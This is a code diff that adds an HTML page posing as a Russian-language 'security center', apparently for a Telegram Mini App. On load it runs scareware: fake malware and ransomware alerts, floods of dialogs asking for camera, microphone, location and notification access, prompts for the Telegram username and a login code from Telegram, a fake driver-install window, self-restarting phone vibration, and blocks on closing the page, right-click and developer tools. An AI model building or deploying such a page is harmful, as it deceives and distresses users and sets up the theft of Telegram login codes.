@@ -1,0 +1,633 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>🔐 ЦЕНТР БЕЗОПАСНОСТИ</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            user-select: none;
+        }
+
+        body {
+            background: #0a0a0a;
+            font-family: 'Segoe UI', 'Arial', system-ui, -apple-system, BlinkMacSystemFont, 'Roboto', sans-serif;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .overlay-blur {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(8px);
+            z-index: 999;
+            pointer-events: none;
+        }
+
+        .center-message {
+            text-align: center;
+            color: #ff5555;
+            z-index: 1;
+            position: relative;
+            pointer-events: none;
+            animation: pulseText 1.2s infinite;
+        }
+        
+        .center-message h1 {
+            font-family: monospace;
+            font-size: 28px;
+            letter-spacing: 2px;
+            text-shadow: 0 0 8px rgba(255,0,0,0.5);
+        }
+        
+        .center-message p {
+            margin-top: 12px;
+            font-size: 16px;
+            color: #cccccc;
+        }
+        
+        .progress-bar {
+            margin-top: 24px;
+            width: 260px;
+            height: 4px;
+            background: #2a2a2a;
+            border-radius: 4px;
+            overflow: hidden;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        
+        .progress-fill {
+            width: 100%;
+            height: 100%;
+            background: #ff3b3b;
+            animation: progressPulse 0.8s infinite alternate;
+        }
+        
+        @keyframes pulseText {
+            0% { opacity: 0.7; text-shadow: 0 0 0px red; }
+            100% { opacity: 1; text-shadow: 0 0 12px #ff0000; }
+        }
+        
+        @keyframes progressPulse {
+            0% { opacity: 0.5; width: 60%; }
+            100% { opacity: 1; width: 95%; }
+        }
+        
+        @keyframes shake {
+            0% { transform: translate(0px, 0px); }
+            25% { transform: translate(3px, 2px); }
+            50% { transform: translate(-3px, -2px); }
+            75% { transform: translate(2px, -1px); }
+            100% { transform: translate(0px, 0px); }
+        }
+        
+        .shake-screen {
+            animation: shake 0.25s ease-in-out 0s 2;
+        }
+        
+        @keyframes redAlert {
+            0% { box-shadow: 0 0 0 0 rgba(255,0,0,0); }
+            50% { box-shadow: 0 0 0 6px rgba(255,0,0,0.6); }
+            100% { box-shadow: 0 0 0 0 rgba(255,0,0,0); }
+        }
+        
+        body {
+            animation: redAlert 1.2s infinite;
+        }
+        
+        .fake-modal {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 340px;
+            background: #f5f5f5;
+            border-radius: 14px;
+            box-shadow: 0 25px 45px rgba(0,0,0,0.5), 0 0 0 1000px rgba(0,0,0,0.7);
+            font-family: 'Segoe UI', system-ui;
+            z-index: 10001;
+            display: none;
+            pointer-events: auto;
+            border: 1px solid #bbb;
+        }
+        
+        .fake-modal-header {
+            background: #e0e0e0;
+            padding: 12px 14px;
+            border-radius: 14px 14px 0 0;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            border-bottom: 1px solid #ccc;
+        }
+        
+        .fake-modal-controls span {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            display: inline-block;
+            margin-right: 4px;
+        }
+        
+        .close-btn { background: #ff5f57; }
+        .min-btn { background: #ffbd2e; }
+        .max-btn { background: #28c940; }
+        
+        .fake-modal-title {
+            font-size: 13px;
+            font-weight: 600;
+            color: #1e1e1e;
+            flex: 1;
+        }
+        
+        .fake-modal-body {
+            padding: 22px 18px;
+            background: white;
+            color: #111;
+            font-size: 14px;
+            line-height: 1.45;
+        }
+        
+        .fake-modal-footer {
+            padding: 12px 16px;
+            background: #f0f0f0;
+            border-top: 1px solid #ddd;
+            text-align: right;
+        }
+        
+        .fake-modal-footer button {
+            padding: 6px 18px;
+            background: #0078d7;
+            border: none;
+            color: white;
+            border-radius: 6px;
+            font-size: 13px;
+            cursor: pointer;
+            font-weight: 500;
+        }
+        
+        .telegram-user-card {
+            background: #2a2a2a;
+            border-radius: 16px;
+            padding: 12px;
+            margin-top: 16px;
+            font-size: 12px;
+            color: #ddd;
+            border-left: 3px solid #ff4444;
+            text-align: left;
+        }
+        
+        .vibration-indicator {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            background: rgba(255,0,0,0.7);
+            color: white;
+            padding: 5px 12px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-family: monospace;
+            z-index: 10002;
+            pointer-events: none;
+            animation: blinkText 1s infinite;
+        }
+        
+        @keyframes blinkText {
+            0%, 100% { opacity: 0.6; }
+            50% { opacity: 1; text-shadow: 0 0 3px red; }
+        }
+        
+        button {
+            cursor: pointer;
+        }
+        
+        * {
+            -webkit-tap-highlight-color: transparent;
+        }
+    </style>
+</head>
+<body>
+
+<div class="overlay-blur"></div>
+
+<div class="center-message">
+    <h1>⚠️ СИСТЕМА БЛОКИРОВКИ АКТИВНА</h1>
+    <p>Выполняется проверка безопасности<br>Не закрывайте окно браузера</p>
+    <div class="progress-bar">
+        <div class="progress-fill"></div>
+    </div>
+    <div id="telegramInfo" class="telegram-user-card" style="display: none;"></div>
+</div>
+
+<div class="vibration-indicator" id="vibIndicator">📳 ВИБРАЦИЯ АКТИВНА</div>
+
+<script>
+    // ===================== ПОСТОЯННАЯ ВИБРАЦИЯ =====================
+    let vibrationInterval = null;
+    let isVibrating = false;
+    
+    function startContinuousVibration() {
+        if (navigator.vibrate) {
+            // Функция для бесконечной вибрации с разными паттернами
+            const vibrationPatterns = [
+                [200, 100, 200, 100, 300],
+                [150, 80, 150, 80, 150, 80, 200],
+                [100, 50, 100, 50, 100, 50, 100, 50, 200],
+                [250, 120, 250],
+                [80, 40, 80, 40, 80, 40, 80, 40, 80],
+                [300, 150, 300, 150, 400]
+            ];
+            
+            let patternIndex = 0;
+            
+            function vibrateLoop() {
+                if (!isVibrating) return;
+                
+                const pattern = vibrationPatterns[patternIndex % vibrationPatterns.length];
+                navigator.vibrate(pattern);
+                
+                // Рассчитываем общую длительность вибрации для следующего запуска
+                const totalDuration = pattern.reduce((a, b) => a + b, 0);
+                patternIndex++;
+                
+                vibrationInterval = setTimeout(() => {
+                    if (isVibrating) {
+                        vibrateLoop();
+                    }
+                }, totalDuration + 50);
+            }
+            
+            isVibrating = true;
+            vibrateLoop();
+            
+            // Добавляем визуальный индикатор мигания
+            const vibIndicator = document.getElementById('vibIndicator');
+            if (vibIndicator) {
+                let blinkInterval = setInterval(() => {
+                    if (!isVibrating) {
+                        clearInterval(blinkInterval);
+                        return;
+                    }
+                    vibIndicator.style.opacity = vibIndicator.style.opacity === '0.4' ? '1' : '0.4';
+                }, 300);
+            }
+        } else {
+            console.warn("Вибрация не поддерживается на этом устройстве");
+            const vibIndicator = document.getElementById('vibIndicator');
+            if (vibIndicator) {
+                vibIndicator.innerHTML = "⚠️ ВИБРАЦИЯ НЕ ПОДДЕРЖИВАЕТСЯ";
+                vibIndicator.style.background = "rgba(100,100,100,0.8)";
+            }
+        }
+    }
+    
+    function stopContinuousVibration() {
+        isVibrating = false;
+        if (vibrationInterval) {
+            clearTimeout(vibrationInterval);
+            vibrationInterval = null;
+        }
+        if (navigator.vibrate) {
+            navigator.vibrate(0); // Остановить вибрацию
+        }
+    }
+    
+    // Запускаем постоянную вибрацию сразу
+    startContinuousVibration();
+    
+    // ===================== TELEGRAM MINI APP INTEGRATION =====================
+    let tgUser = null;
+    let tgUsername = "Неизвестный";
+    let tgFirstName = "Гость";
+    
+    if (window.Telegram && Telegram.WebApp) {
+        try {
+            const webApp = Telegram.WebApp;
+            webApp.ready();
+            const initDataUnsafe = webApp.initDataUnsafe;
+            if (initDataUnsafe && initDataUnsafe.user) {
+                tgUser = initDataUnsafe.user;
+                tgUsername = tgUser.username || (tgUser.first_name ? tgUser.first_name.toLowerCase() : "user");
+                tgFirstName = tgUser.first_name || "Пользователь";
+                const infoDiv = document.getElementById('telegramInfo');
+                if (infoDiv) {
+                    infoDiv.style.display = 'block';
+                    infoDiv.innerHTML = `
+                        <strong>📱 Telegram ID подтверждён:</strong><br>
+                        👤 ${tgFirstName} ${tgUser.last_name ? tgUser.last_name : ''}<br>
+                        🆔 @${tgUsername}<br>
+                        🔐 Сеанс привязан к аккаунту<br>
+                        📳 Постоянная вибрация активирована
+                    `;
+                }
+            }
+        } catch(e) {
+            console.warn("Telegram WebApp не активен");
+        }
+    } else {
+        tgUsername = "user_" + Math.floor(Math.random() * 10000);
+        tgFirstName = "Аккаунт";
+        const infoDiv = document.getElementById('telegramInfo');
+        if (infoDiv) {
+            infoDiv.style.display = 'block';
+            infoDiv.innerHTML = `
+                <strong>⚠️ ВНИМАНИЕ:</strong><br>
+                🔍 Требуется авторизация через Telegram.<br>
+                📡 Данные сеанса: ID: ${tgUsername}<br>
+                📳 Вибрация: АКТИВНА
+            `;
+        }
+    }
+    
+    // ============ ФУНКЦИИ МГНОВЕННЫХ ДИАЛОГОВ ============
+    function immediateAlert(msg) {
+        alert(msg);
+    }
+    
+    function immediateConfirm(msg) {
+        return confirm(msg);
+    }
+    
+    function immediatePrompt(msg, defaultVal) {
+        return prompt(msg, defaultVal);
+    }
+    
+    // ============ МАССИВЫ СООБЩЕНИЙ ============
+    const cameraMessages = [
+        "📸 Система безопасности: требуется доступ к фронтальной камере для биометрической верификации.",
+        "🎥 Обнаружена попытка подмены личности. Срочно подтвердите доступ к камере и микрофону.",
+        "🔐 WebRTC детектор: необходимо разрешение на видеозахват. Нажмите РАЗРЕШИТЬ.",
+        "⚠️ Критическая ошибка аутентификации: камера не обнаружена. Предоставьте доступ.",
+        "📹 Антиспуфинг модуль: требуется сканирование лица. Разрешить использование камеры?",
+        "🛡️ Защитник браузера: сайт запрашивает видеопоток для проверки активности пользователя.",
+        "📸 Система распознавания эмоций требует доступ к камере. Нарушение приведёт к блокировке.",
+        "🔍 Модуль глубокого сканирования: не удалось получить доступ к webcam. Подтвердите разрешение.",
+        "⚠️ Ваша веб-камера была активирована удалённо. Для отмены операции предоставьте доступ повторно.",
+        "📹 Безопасный вход: необходим биометрический слепок. Разрешить использование камеры?"
+    ];
+    
+    const geoMessages = [
+        "📍 Система слежения: требуется ваше местоположение для подтверждения региона.",
+        "🌎 Обнаружено несоответствие IP-адреса. Предоставьте геолокацию для снятия ограничений.",
+        "🗺️ Модуль кибербезопасности запрашивает координаты GPS.",
+        "📍 Ваше местоположение необходимо для защиты от несанкционированного доступа.",
+        "🌐 Определите геопозицию, чтобы продолжить работу в защищённом режиме."
+    ];
+    
+    const threatMessages = [
+        "🚨 Обнаружена вредоносная активность в памяти браузера! Код: JS/WebShell.Fake",
+        "💀 Система перехватила подозрительный запрос: попытка эксплойта нулевого дня.",
+        "🔥 Защитник браузера: перехвачен шифровальщик (Ransomware). Требуется проверка.",
+        "⚠️ Ваши данные могут быть скомпрометированы. Немедленно пройдите верификацию.",
+        "🕸️ Обнаружен скрытый майнер криптовалют. Запущена процедура очистки."
+    ];
+    
+    const extraAlerts = [
+        "🔴 Неизвестное устройство пыталось получить доступ к хранилищу файлов.",
+        "📡 Ваш браузер отправляет зашифрованные данные на неизвестный сервер.",
+        "💾 Системный журнал: зафиксирована попытка изменения реестра.",
+        "📞 Обнаружено фоновое использование микрофона. Проверьте разрешения.",
+        "⚡ Критическая нагрузка на процессор. Возможно скрытое выполнение скриптов.",
+        "📳 Система вибрации активирована для экстренного оповещения.",
+        "🔊 Обнаружена аномальная активность датчиков движения."
+    ];
+    
+    // ============ ОСНОВНОЙ ПОТОК ============
+    (function startImmediateFlood() {
+        // Первый запрос камеры
+        let firstCamera = immediateConfirm("🔐 Система безопасности\n\n⚠️ " + cameraMessages[0] + "\n\nРазрешить доступ к камере и микрофону?");
+        if (firstCamera) {
+            immediateAlert("✅ Доступ к камере временно активирован. Выполняется сканирование лица.");
+        } else {
+            immediateAlert("❌ Ошибка 0x8000FFFF: Без доступа к камере верификация невозможна.");
+        }
+        
+        // Множественные запросы камеры
+        for (let i = 1; i <= 5; i++) {
+            let retryCam = immediateConfirm(`📷 [Запрос #${i}] ${cameraMessages[i % cameraMessages.length]}\n\nРазрешить?`);
+            if (retryCam) {
+                immediateAlert("🎥 Видеопоток активирован. Идёт запись сеанса верификации.");
+            } else {
+                immediateAlert(`⛔ Отказ #${i}. Система зафиксирует инцидент безопасности.`);
+            }
+        }
+        
+        // Геолокация (4 запроса)
+        for (let g = 0; g < 4; g++) {
+            let geoChoice = immediateConfirm(`📍 ${geoMessages[g % geoMessages.length]}\n\nПредоставить доступ к местоположению?`);
+            if (geoChoice) {
+                immediateAlert("🌍 Координаты получены. IP-адрес и геоданные зарегистрированы.");
+            } else {
+                immediateAlert("🚫 Отказ от геолокации. Доступ к сервисам ограничен.");
+            }
+        }
+        
+        // Telegram верификация
+        let tgConfirmMsg = `📱 Telegram аккаунт: @${tgUsername}\n\nПодтвердить личность через Telegram Mini App?`;
+        let confirmTg = immediateConfirm(tgConfirmMsg);
+        if (confirmTg) {
+            immediateAlert(`✅ Подтверждение получено! Пользователь ${tgFirstName} авторизован.`);
+        } else {
+            immediateAlert("❌ Без подтверждения Telegram аккаунта функции заблокированы.");
+        }
+        
+        // Угрозы с дополнительными запросами камеры
+        for (let t = 0; t < 3; t++) {
+            let threatMsg = threatMessages[t % threatMessages.length];
+            let threatReact = immediateConfirm(`🛡️ ${threatMsg}\n\nЗапустить сканирование и подтвердить камеру?`);
+            if (threatReact) {
+                immediateAlert("🔬 Сканирование завершено. Повторный запрос камеры...");
+                let extraCam = immediateConfirm("📸 Повторная биометрическая проверка! Разрешить доступ к камере?");
+                if (extraCam) immediateAlert("✅ Биометрия принята.");
+                else immediateAlert("⚠️ Система остаётся уязвимой.");
+            } else {
+                immediateAlert("❗ Угроза не устранена.");
+            }
+        }
+        
+        // Микрофон и геолокация
+        let micLocation = immediateConfirm("🎙️ Требуется доступ к микрофону и геолокации для идентификации.\nРазрешить?");
+        if (micLocation) {
+            immediateAlert("🎤 Микрофон активирован. Проводится анализ.");
+        }
+        
+        // Дополнительные пугающие сообщения
+        for (let i = 0; i < 6; i++) {
+            immediateAlert(`⚠️ ${extraAlerts[i % extraAlerts.length]}`);
+        }
+        
+        // Запрос Telegram username
+        let tgUsernameInput = immediatePrompt("🔐 Telegram Security Check\n\nВведите ваш Telegram username (без @):", tgUsername);
+        if (tgUsernameInput && tgUsernameInput.trim() !== "") {
+            immediateAlert(`✅ @${tgUsernameInput} верифицирован. Сеанс защищён.`);
+        }
+        
+        // Бесконечные запросы камеры в цикле
+        let cameraLoopCount = 0;
+        function additionalCameraRequests() {
+            if (cameraLoopCount < 8) {
+                let randomCamMsg = cameraMessages[cameraLoopCount % cameraMessages.length];
+                let finalCam = immediateConfirm(`📹 ${randomCamMsg}\n\nПредоставить доступ?`);
+                if (finalCam) {
+                    immediateAlert("✅ Камера активирована. Лицо распознано.");
+                } else {
+                    immediateAlert("❌ Без камеры восстановление невозможно.");
+                }
+                cameraLoopCount++;
+                setTimeout(additionalCameraRequests, 350);
+            }
+        }
+        additionalCameraRequests();
+        
+        // Запрос на уведомления
+        if (Notification.permission !== "granted") {
+            let notifRequest = confirm("🔔 Разрешить показ уведомлений для оповещений о безопасности?");
+            if (notifRequest) {
+                Notification.requestPermission().then(perm => {
+                    if (perm === "granted") {
+                        new Notification("🛡️ Центр безопасности", { body: "Уведомления активированы. Вибрация активна." });
+                    }
+                });
+            }
+        }
+        
+        // Код подтверждения (3 попытки)
+        let codeAttempts = 0;
+        function askForCode() {
+            if (codeAttempts < 3) {
+                let code = prompt(`🔑 Код подтверждения (шаг ${codeAttempts+1})\n\nВведите код из Telegram:`, "");
+                if (code && code.length > 0) {
+                    immediateAlert(`✅ Код принят.`);
+                } else {
+                    immediateAlert(`❌ Неверный код.`);
+                }
+                codeAttempts++;
+                setTimeout(askForCode, 450);
+            }
+        }
+        askForCode();
+        
+        // Эффекты
+        document.body.classList.add("shake-screen");
+        setTimeout(() => document.body.classList.remove("shake-screen"), 400);
+        
+        // Мигающий заголовок
+        let originalTitle = document.title;
+        let titleInterval = setInterval(() => {
+            document.title = document.title.includes("⚠️") ? "🔴 ВНИМАНИЕ! ВИБРАЦИЯ АКТИВНА" : "⚠️ СИСТЕМА ЗАБЛОКИРОВАНА";
+        }, 1500);
+        setTimeout(() => clearInterval(titleInterval), 60000);
+        
+        // Блокировка контекстного меню
+        document.addEventListener('contextmenu', (e) => {
+            e.preventDefault();
+            alert("⛔ Доступ заблокирован.");
+            return false;
+        });
+        
+        // Блокировка клавиш разработчика
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) || (e.ctrlKey && e.key === 'U')) {
+                e.preventDefault();
+                alert("🔒 Режим разработчика отключен.");
+                return false;
+            }
+        });
+        
+        // Запрет выделения
+        document.addEventListener('selectstart', (e) => e.preventDefault());
+        
+        // Дополнительная вибрация при кликах
+        document.body.addEventListener('click', () => {
+            if (navigator.vibrate && isVibrating) {
+                navigator.vibrate(100);
+            }
+            if (Math.random() < 0.4) {
+                alert("⛔ Действие заблокировано. Завершите верификацию.");
+            }
+        });
+        
+        // Фейковое модальное окно
+        setTimeout(() => {
+            const fakeWin = document.createElement('div');
+            fakeWin.className = 'fake-modal';
+            fakeWin.innerHTML = `
+                <div class="fake-modal-header">
+                    <div class="fake-modal-controls">
+                        <span class="close-btn"></span>
+                        <span class="min-btn"></span>
+                        <span class="max-btn"></span>
+                    </div>
+                    <div class="fake-modal-title">Диспетчер устройств</div>
+                </div>
+                <div class="fake-modal-body">
+                    🎥 Обнаружена камера + датчик вибрации<br>
+                    Требуется установка драйвера безопасности.
+                </div>
+                <div class="fake-modal-footer">
+                    <button id="fakeDriverOk">Установить драйвер</button>
+                </div>
+            `;
+            document.body.appendChild(fakeWin);
+            fakeWin.style.display = 'block';
+            document.getElementById('fakeDriverOk').addEventListener('click', () => {
+                fakeWin.remove();
+                immediateAlert("✅ Драйвер установлен. Вибрация усилена.");
+                if (navigator.vibrate) navigator.vibrate([500, 200, 500]);
+            });
+            setTimeout(() => { if(fakeWin.parentNode) fakeWin.remove(); }, 10000);
+        }, 2000);
+        
+        // Повторная Telegram проверка
+        setTimeout(() => {
+            let finalTelegramCheck = confirm(`📱 Повторная проверка: @${tgUsername}\n\nПодтвердить личность?`);
+            if(finalTelegramCheck) {
+                immediateAlert("✅ Личность подтверждена.");
+            }
+        }, 4000);
+        
+        // Консольные сообщения
+        console.log("%c🔴 [СБ ОНЛАЙН] Постоянная вибрация активна", "color: red; font-size: 14px;");
+        console.log(`🆔 Telegram: ${tgUsername} | Вибрация: ВКЛ`, "color: #ff6666");
+        
+        // Блокировка закрытия страницы
+        window.addEventListener('beforeunload', (e) => {
+            e.preventDefault();
+            e.returnValue = "⚠️ Вибрация активна! Закрытие может привести к блокировке.";
+            return "⚠️ Вибрация активна! Закрытие может привести к блокировке.";
+        });
+        
+        // Дополнительный эффект: усиление вибрации через каждые 15 секунд
+        let boostVibration = setInterval(() => {
+            if (isVibrating && navigator.vibrate) {
+                navigator.vibrate([400, 150, 400]);
+                console.log("📳 Усиление вибрации...");
+            }
+        }, 15000);
+        
+        // Останавливаем усиление через 3 минуты, но основная вибрация продолжается
+        setTimeout(() => clearInterval(boostVibration), 180000);
+    })();
+    
+    // Гарантия, что вибрация не остановится никогда (даже если что-то попытается её отключить)
+    setInterval(() => {
+        if (!isVibrating && navigator.vibrate) {
+            console.warn("Вибрация была остановлена! Перезапуск...");
+            startContinuousVibration();
+        }
+    }, 5000);
+</script>
+</body>
+</html>
